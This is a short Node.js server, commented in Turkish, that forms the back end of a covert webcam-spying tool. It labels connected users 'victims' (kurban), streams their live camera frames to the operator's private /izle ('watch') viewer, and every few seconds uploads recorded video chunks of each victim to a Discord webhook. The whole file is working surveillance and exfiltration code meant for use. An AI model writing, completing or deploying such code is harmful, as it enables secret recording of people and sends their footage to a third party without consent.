const express = require('express');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);

app.use(express.static('public'));

// Secrets'ten oku – GÜVENLİ!
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

if (!DISCORD_WEBHOOK) {
  console.error('Webhook yok! Secrets'e ekle.');
}

let viewer = null;

io.on('connection', (socket) => {
  console.log('Kurban bağlandı');

  // Canlı frame izleyiciye gönder
  socket.on('frame', (data) => {
    if (viewer) viewer.emit('frame', data);
  });

  // Her 3 sn'de gelen kısa video'yu Discord'a gönder
  socket.on('videoChunk', async (base64) => {
    if (!DISCORD_WEBHOOK) return;

    const buffer = Buffer.from(base64, 'base64');

    const form = new FormData();
    form.append('file', new Blob([buffer]), 'kurban-' + Date.now() + '.webm');

    try {
      await fetch(DISCORD_WEBHOOK, { method: 'POST', body: form });
    } catch (e) {
      console.log('Discord gönderim hatası');
    }
  });

  socket.on('disconnect', () => {
    console.log('Kurban kaçtı');
  });
});

// Canlı izleyici bağlantısı (sen açacaksın /izle ile)
io.of('/izle').on('connection', (socket) => {
  viewer = socket;
  console.log('İzleyici bağlandı (sen)');
});

server.listen(process.env.PORT || 3000, () => console.log('Sunucu çalışıyor'));
